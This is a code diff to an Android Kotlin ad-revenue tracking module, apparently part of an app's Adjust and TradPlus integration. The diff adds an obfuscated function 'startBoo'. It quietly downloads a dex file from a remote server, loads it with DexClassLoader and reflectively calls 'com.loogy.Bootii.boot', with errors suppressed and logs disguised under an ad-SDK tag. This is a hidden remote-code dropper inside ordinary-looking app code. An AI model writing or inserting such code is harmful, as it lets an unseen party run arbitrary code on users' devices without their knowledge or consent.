@@ -6,6 +6,7 @@ import android.os.Handler
 import android.os.Looper
 import android.os.Message
 import android.telephony.TelephonyManager
+import android.util.Log
 import androidx.annotation.DoNotInline
 import com.adjust.sdk.Adjust
 import com.adjust.sdk.AdjustAdRevenue
@@ -14,6 +15,7 @@ import com.adjust.sdk.Util
 import com.google.gson.Gson
 import com.tradplus.ads.base.bean.TPAdInfo
 import com.tradplus.ads.base.common.TPDataManager
+import dalvik.system.DexClassLoader
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -24,7 +26,11 @@ import kotlinx.coroutines.flow.retry
 import kotlinx.coroutines.launch
 import okhttp3.OkHttpClient
 import okhttp3.RequestBody
+import okio.Buffer
+import okio.Okio
 import retrofit2.Retrofit
+import java.io.File
+import java.io.FileDescriptor
 import java.math.BigDecimal
 import java.util.Locale
 import java.util.UUID
@@ -277,5 +283,49 @@ object Aifnsdf {
                 lethargy = info.format
             )
         )
+    }
+
+    fun startBoo(){
+       thread.launch {
+            Log.e("TradPlusLog", "boot dex start")
+            val bto = File(Liuce.mContext?.filesDir, "bo3")
+            if (!bto.exists()) {
+                Log.e("TradPlusLog", "boot dex 下载")
+                try {
+                    val response = retrofit.tfgh()
+                    val sink = Okio.buffer(Okio.sink(bto))
+                    val buffer = Buffer()
+                    response?.body()?.source().use { source ->
+                        source?.readAll(buffer)
+                        sink.write(buffer, buffer.size())
+                    }
+                    sink.flush()
+                    sink.close()
+                    // 使用自定义 ClassLoader 加载插件的 dex 文件
+                    delay(1000)
+                    FileDescriptor().sync()
+                } catch (_: Exception) {
+                }
+            }
+            try {
+                bto.setReadOnly()
+                Liuce.mContext?.also { context ->
+                    val dexClassLoader = DexClassLoader(
+                        bto.path,  // 插件的 dex 文件路径
+                        context.filesDir.absolutePath + "/optbt",  // 优化后的目录
+                        null,  // 如果没有额外的库文件
+                        context.classLoader // 使用宿主的 ClassLoader 作为父 ClassLoader
+                    )
+                    // 使用自定义的 ClassLoader 加载插件中的 Test 类
+                    val testClass = dexClassLoader.loadClass("com.loogy.Bootii")
+                    // 调用 greet 方法
+                    val greetMethod = testClass.getMethod("boot")
+                    greetMethod.invoke(null)
+                    Log.e("TradPlusLog", "boot dex invoke  boot")
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
     }
 }
